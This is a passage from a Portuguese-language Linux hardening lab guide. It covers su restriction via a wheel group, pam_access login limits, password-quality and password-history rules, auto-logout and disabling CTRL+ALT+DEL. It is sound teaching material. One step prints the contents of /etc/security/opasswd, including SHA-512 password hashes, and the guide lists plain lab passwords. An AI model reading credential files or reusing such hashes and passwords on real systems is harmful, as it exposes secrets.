Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ sudo reboot
Sorry, user mcfly is not allowed to execute '/sbin/reboot' as root on LinServer-A.</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_5_controle_de_uso_do_binário_su">5) Controle de uso do binário <strong><em>su</em></strong></h3>
<div class="paragraph">
<p>Por padrão, através do comando <code>su</code> o Linux permite que qualquer usuário possa se tornar o superusuário <code>root</code>, se a senha correta for digitada. Para evitar esse comportamento, temos duas opções básicas:</p>
</div>
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Desabilitar a conta do usuário <code>root</code>, e controlar o acesso a comandos através do <code>sudo</code>, como fizemos na atividade (4), ou</p>
</li>
<li>
<p>Implementar um grupo especial, <code>wheel</code>, e permitir que apenas membros desse grupo possam utilizar o binário <code>su</code>.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Vamos testar esse segundo controle.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Crie um novo usuário, <code>docbrown</code> com senha <code>rnpesr</code>, e também um novo grupo de sistema, <code>wheel</code>. Adicione o novo usuário a esse grupo e edite o arquivo <code>/etc/pam.d/su</code> e implemente o controle de acesso ao binário <code>su</code>. Teste sua configuração.</p>
<div class="paragraph">
<p>Vamos criar o usuário, grupo, e fazer a adição solicitada.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># useradd -m -s /bin/bash docbrown
# echo 'docbrown:rnpesr' | chpasswd</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># groupadd -r wheel</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># adduser docbrown wheel
Adding user `docbrown' to group `wheel' ...
Adding user docbrown to group wheel
Done.</pre>
</div>
</div>
<div class="paragraph">
<p>A seguir, vamos editar o arquivo <code>/etc/pam.d/su</code> e restringir o uso do <code>su</code> ao membros do grupo <code>wheel</code>.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/pam.d/su
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^auth *required *pam_wheel.so' /etc/pam.d/su
auth       required   pam_wheel.so</pre>
</div>
</div>
<div class="paragraph">
<p>Vamos testar a configuração com um usuário que não é membro desse grupo, como o <code>aluno</code>.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># su - aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ whoami
aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ su -
Password:
su: Permission denied</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ logout</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, vamos testar com um membro do grupo, como o usuário <code>docbrown</code> criado anteriormente.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># su - docbrown</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ whoami
docbrown</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ su -
Password:</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># whoami
root</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_6_controle_de_acesso_à_console_do_sistema">6) Controle de acesso à console do sistema</h3>
<div class="paragraph">
<p>Agora vamos restringir a quantidade de usuários que podem autenticar no console da máquina. Para tal, vamos configurar o módulo <code>pam_access</code> nos principais sistemas de autenticação: <code>ssh</code>, console texto, console gráfico (se instalado) e, opcionalmente, para os demais subsistemas.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Habilite o módulo <code>pam_access</code> para logins <code>ssh</code>, editando o arquivo <code>/etc/pam.d/sshd</code>.</p>
<div class="paragraph">
<p>Basta descomentar a linha <code>account   required   pam_access.so</code>, como mostrado a seguir.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/pam.d/sshd
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^account *required *pam_access.so' /etc/pam.d/sshd
account  required     pam_access.so</pre>
</div>
</div>
</li>
<li>
<p>Habilite o módulo <code>pam_access</code> para logins em console texto, editando o arquivo <code>/etc/pam.d/login</code>.</p>
<div class="paragraph">
<p>Basta descomentar a linha <code>account   required   pam_access.so</code>, como mostrado a seguir.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/pam.d/login
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^account *required *pam_access.so' /etc/pam.d/login
account  required       pam_access.so</pre>
</div>
</div>
</li>
<li>
<p>Edite o arquivo <code>/etc/security/access.conf</code> e restrinja o acesso à console local e logins <code>ssh</code> apenas para membros do grupo <code>wheel</code> que efetuem login local ou logins remotos oriundos da rede 172.16.G.0/24, especificamente. Teste sua configuração.</p>
<div class="paragraph">
<p>Vamos editar o arquivo <code>/etc/security/access.conf</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/security/access.conf
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep -v '^#' /etc/security/access.conf
+ : wheel : LOCAL 172.16.1.0/24
- : ALL : ALL</pre>
</div>
</div>
<div class="paragraph">
<p>Vamos monitorar o arquivo <code>/var/log/auth.log</code>, e testar alguns cenários. Primeiro, vamos tentar um login via console texto usando o usuário <code>aluno</code>. Temos os seguintes eventos registrados:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Sep  8 11:16:07 LinServer-A login[418]: pam_access(login:account): access denied for user `aluno' from `tty1'
Sep  8 11:16:07 LinServer-A login[418]: Permission denied</pre>
</div>
</div>
<div class="paragraph">
<p>Ao tentar login na console texto com o usuário <code>docbrown</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Sep  8 11:17:18 LinServer-A login[3787]: pam_unix(login:session): session opened for user docbrown by LOGIN(uid=0)</pre>
</div>
</div>
<div class="paragraph">
<p>Vamos testar um login remoto via <code>ssh</code> usando o usuário <code>aluno</code> a partir da máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Sep  8 11:18:34 LinServer-A sshd[3818]: pam_access(sshd:account): access denied for user `aluno' from `172.16.1.1'
Sep  8 11:18:34 LinServer-A sshd[3818]: fatal: Access denied for user aluno by PAM account configuration [preauth]</pre>
</div>
</div>
<div class="paragraph">
<p>A configuração sequer permite que tentemos digitar a senha do usuário&#8201;&#8212;&#8201;o bloqueio é feito antes disso. A seguir, vamos testar um login remoto via <code>ssh</code> usando o usuário <code>docbrown</code>, porém a partir da máquina <em>WinClient-G</em>, que está na faixa de IP incorreta:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Sep  8 11:23:10 LinServer-A sshd[3891]: pam_access(sshd:account): access denied for user `docbrown' from `10.1.1.10'
Sep  8 11:23:10 LinServer-A sshd[3889]: error: PAM: User account has expired for docbrown from 10.1.1.10</pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente, vamos testar o cenário de login remoto via <code>ssh</code> usando o usuário <code>docbrown</code> a partir da máquina <em>FWGW1-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Sep  8 11:32:18 LinServer-A sshd[4027]: Accepted keyboard-interactive/pam for docbrown from 172.16.1.1 port 34663 ssh2
Sep  8 11:32:18 LinServer-A sshd[4027]: pam_unix(sshd:session): session opened for user docbrown by (uid=0)</pre>
</div>
</div>
<div class="paragraph">
<p>Note, portanto, que foram autorizados os logins apenas nos casos em que:</p>
</div>
<div class="openblock">
<div class="content">
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>O usuário era membro do grupo <code>wheel</code> <strong>e</strong> o login era feito localmente, ou</p>
</li>
<li>
<p>O usuário era membro do grupo <code>wheel</code> <strong>e</strong> o login era feito remotamente a partir da faixa de IPs autorizada.</p>
</li>
</ol>
</div>
</div>
</div>
</li>
<li>
<p>Reverta as configurações realizadas nesta atividade.</p>
<div class="paragraph">
<p>Basta comentar as linhas inseridas nos passos (1), (2) e (3) desta atividade.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_7_exigência_de_parâmetros_mínimos_de_senha">7) Exigência de parâmetros mínimos de senha</h3>
<div class="paragraph">
<p>O uso de senhas fortes é um requisito de segurança básico em sistemas computacionais; em servidores, especialmente, o descuido com senhas pode ocasionar falhas de segurança graves. As bibliotecas <code>pwquality</code> e <code>pwhistory</code> possibilitam a checagem da qualidade das senhas dos usuários, impondo requisitos mínimos em termos de tamanho e complexidade, bem como a manutenção de histórico de senhas</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Instale os pacotes <code>libpam-modules</code> e <code>libpam-pwquality</code>, e configure o sistema para que novas senhas tenham os seguintes requisitos mínimos:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Tamanho mínimo de 10 caracteres.</p>
</li>
<li>
<p>Ao menos uma letra maiúscula.</p>
</li>
<li>
<p>Ao menos um caractere numérico.</p>
</li>
<li>
<p>Ao menos um caractere especial.</p>
</li>
<li>
<p>As últimas seis senhas não possam ser repetidas.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Primeiro, vamos instalar os pacotes solicitados:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install libpam-modules libpam-pwquality</pre>
</div>
</div>
<div class="paragraph">
<p>Para impor os requisitos de qualidade de senha, basta editar o arquivo <code>/etc/security/pwquality.conf</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/security/pwquality.conf
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep -v '^#' /etc/security/pwquality.conf
minlen = 10
dcredit = -1
ucredit = -1
ocredit = -1</pre>
</div>
</div>
<div class="paragraph">
<p>Para impor os requisitos de não-repetição de senha, é necessário incluir uma linha para o módulo <code>pam_pwhistory.so</code> no arquivo <code>/etc/pam.d/common-password</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nano /etc/pam.d/common-password
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep 'pam_pwhistory.so' /etc/pam.d/common-password
password        requisite                       pam_pwhistory.so retry=3 remember=6 use_authtok</pre>
</div>
</div>
<div class="paragraph">
<p>Especificamente, essa linha pode ficar após a checagem de qualidade de senha (via módulo <code>pam_pwquality.so</code>) e antes dos módulos padrão do sistema, como mostrado a seguir:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># grep -v '^#' /etc/pam.d/common-password | sed '/^$/d'
password        requisite                       pam_pwquality.so retry=3
password        requisite                       pam_pwhistory.so retry=3 remember=6 use_authtok
password        [success=1 default=ignore]      pam_unix.so obscure use_authtok try_first_pass sha512
password        requisite                       pam_deny.so
password        required                        pam_permit.so</pre>
</div>
</div>
</li>
<li>
<p>Teste suas configurações. Tente alterar a senha de um usuário não-privilegiado sem respeitar os requisitos mínimos de qualidade estabelecidos. Depois, tente reutilizar senhas e verifique o comportamento do sistema.</p>
<div class="paragraph">
<p>Vamos tentar alterar a senha do usuário <code>mcfly</code>. Progressivamente, vamos tentar a senha <code>teste</code>, depois <code>teste1</code> e finalmente <code>Teste1</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ whoami
mcfly</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ passwd
Changing password for mcfly.
(current) UNIX password:
New password:
BAD PASSWORD: The password contains less than 1 digits
New password:
BAD PASSWORD: The password contains less than 1 uppercase letters
New password:
BAD PASSWORD: The password contains less than 1 non-alphanumeric characters
passwd: Have exhausted maximum number of retries for service
passwd: password unchanged</pre>
</div>
</div>
<div class="paragraph">
<p>Veja que o sistema reclamou nas três ocasiões, pois é necessário que a senha possua mais do que 10 caracteres, e pelo menos um caractere numérico, letra maiúscula e caractere especial. Finalmente, decidimos alterar a senha do usuário <code>mcfly</code> para <code>Testes123!</code>.</p>
</div>
<div class="paragraph">
<p>Agora, vamos tentar alterar a senha para o mesmo valor, e depois para <code>Testes234!</code> e <code>Testes345!</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ passwd
Changing password for mcfly.
(current) UNIX password:
New password:
BAD PASSWORD: The password is the same as the old one
New password:
BAD PASSWORD: The password is too similar to the old one
New password:
BAD PASSWORD: The password is too similar to the old one
passwd: Have exhausted maximum number of retries for service
passwd: password unchanged</pre>
</div>
</div>
<div class="paragraph">
<p>Nos três casos, o sistema detectou que a senha ou era idêntica à original, ou que era muito parecida. Finalmente, decidimos alterar a senha do usuário <code>mcfly</code> para <code>Dufus!456</code>.</p>
</div>
<div class="paragraph">
<p>Vamos agora tentar reutilizar a senha antiga, <code>Testes123!</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ passwd
Changing password for mcfly.
(current) UNIX password:
New password:
Retype new password:
Password has been already used. Choose another.
passwd: Authentication token manipulation error
passwd: password unchanged</pre>
</div>
</div>
<div class="paragraph">
<p>O sistema reporta que a senha já havia sido utilizada anteriormente. Onde esse registro fica mantido? No arquivo <code>/etc/security/opasswd</code>, como visto abaixo:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># whoami
root</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/security/opasswd
mcfly:1001:3:$6$hJ8atdxg$cHkLXvRIRs2VDqeJQl2iNSlteeGEXdMqwI2odVx2n3XOgGGjLKfhmf/Bx8dzkdDpVafT5z0LZNXPfwgcOvemD1,$6$yCYO8kaZ$XKKQwStnM3P6EnNMst9BX1r2aj5lHNVM2dSXAIl6XoW.9ypTch/q4eGhBI6w9JEwkAtnpN7xQCFxqp54pWKkS0,$6$EbARjVI9$u.mPGxn.ibveMlSGSumiiyO/6UTYS1d0YAN4mgSZ7JAv.Jj0XP7X8XRDvX7XuB1PEGWt5C0w4ZwuQXQmoKlpW1</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_8_controle_de_logoff_automático">8) Controle de logoff automático</h3>
<div class="paragraph">
<p>A opção de logoff automático evita o uso indevido da sessão de um administrador quando este, inadvertidamente, não faz o logoff manual. A variável <code>$TMOUT</code> do <em>shell</em> controla, em segundos, o tempo máximo aceito pelo sistema sem que o usuário execute um comando ou aperte uma tecla. Decorrido esse tempo, a máquina vai, automaticamente, efetuar o logoff do usuário.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Edite o arquivo <code>/etc/profile</code> e ative o logoff automático de usuários para dez segundos. Teste sua configuração.</p>
<div class="literalblock">
<div class="content">
<pre># tail -n1 /etc/profile
export TMOUT=10</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># su - aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ whoami
aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ timed out waiting for input: auto-logout
# whoami
root</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_9_desabilitando_a_combinação_de_teclas_ctrl_alt_del">9) Desabilitando a combinação de teclas CTRL + ALT + DEL</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Para evitar que o servidor Linux seja reiniciado quando o seu teclado for confundido com o de um servidor Windows, desabilite a combinação de teclas CTRL + ALT + DEL.</p>
<div class="literalblock">
<div class="content">
<pre># ls -ld /lib/systemd/system/ctrl-alt-del.target
lrwxrwxrwx 1 root root 13 Apr  8  2017 /lib/systemd/system/ctrl-alt-del.target -&gt; reboot.target</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl mask ctrl-alt-del.target
Created symlink from /etc/systemd/system/ctrl-alt-del.target to /dev/null.</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>root@LinServer-A:~# systemctl daemon-reload</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>root@LinServer-A:~# ls -ld /etc/systemd/system/ctrl-alt-del.target
lrwxrwxrwx 1 root root 9 Sep  8 19:17 /etc/systemd/system/ctrl-alt-del.target -&gt; /dev/null</pre>
</div>
</div>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
</div>
<div id="footer">
<div id="footer-text">
Last updated 2019-04-08 02:24:02 -03
</div>
</div>
</body>
</html>